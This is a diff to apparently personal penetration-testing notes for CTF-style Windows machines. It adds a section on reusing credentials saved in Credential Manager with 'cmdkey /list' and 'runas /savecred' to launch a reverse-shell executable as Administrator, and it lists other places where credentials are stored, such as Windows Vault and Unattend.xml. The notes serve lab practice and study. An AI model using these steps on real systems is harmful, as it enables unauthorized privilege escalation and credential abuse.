@@ -61,6 +61,39 @@ Windows web-app service-account foothold.
 
 ---
 
+## Stored credentials — `cmdkey /list` + `runas /savecred`
+
+**Run `cmdkey /list` on every Windows foothold, right after `whoami /priv /all`.** It lists
+credentials saved in Credential Manager. A stored credential for a privileged account is an
+**instant, password-free privilege escalation** — you never learn the password, you just reuse it:
+
+```cmd
+cmdkey /list
+::  Target: Domain:interactive=ACCESS\Administrator   →  a saved Administrator cred exists
+
+runas /user:ACCESS\Administrator /savecred "C:\temp\reverse.exe"
+```
+
+- **`runas /savecred` spawns a separate, non-interactive console**, so point it at a **self-contained
+  reverse-shell payload** (or `cmd /c <action>`), *not* an interactive `cmd` — you'd never see the
+  output of the latter. Drop your reverse-shell EXE first, then `runas` it.
+- Match the **exact stored target name** (`DOMAIN\User`), case aside; a mismatch silently fails.
+- This is a five-second check that belongs in the standard ladder **before** deep enumeration of
+  installed applications.
+
+**Rabbit-hole warning:** a conspicuous third-party application directory (a vendor product under
+`C:\`, its `README`/setup docs, bundled SQL `sa` connection strings, numbered setup scripts) is
+often *bait*. Do the cheap universal checks (`whoami /priv`, `cmdkey /list`, `sudo`-equivalents,
+unquoted-service-path/AlwaysInstallElevated) first; only mine an app's config once those are
+exhausted. Worked example — the privesc that should have taken 30 seconds:
+[Access](../Machines/Access/README.md#-4-privilege-escalation--stored-administrator-credential).
+
+Other credential stores worth the same reflex: `C:\Users\*\…\Microsoft\Credentials`, saved RDP
+`.rdp`/`cmdkey` entries, `runas` history, Windows Vault (`vaultcmd /listcreds:…`), and
+unattended-install files (`Unattend.xml`, `sysprep.inf`) holding plaintext/`AutoLogon` passwords.
+
+---
+
 ## Era-specific kernel/registry CVEs vs. generic privilege abuse
 
 Old, deliberately-unpatched Windows builds frequently have **both** a Potato-family privilege abuse
